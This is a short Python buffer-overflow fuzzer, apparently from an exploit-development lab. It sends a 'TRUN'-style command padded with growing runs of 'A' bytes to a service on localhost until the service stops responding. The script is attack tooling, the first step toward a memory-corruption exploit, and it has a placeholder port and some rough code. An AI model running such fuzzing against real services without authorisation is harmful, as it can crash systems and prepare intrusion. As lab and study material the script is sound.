#!/usr/bin/python
import socket, time, sys

ip = "127.0.0.1"
port = <PORT>
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing loaded with %s bytes" % len(string))
        s.send("store/shell/TRUN/etc-string " + string + "\r\n")
        s.recv(1024)
        s.close()

    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
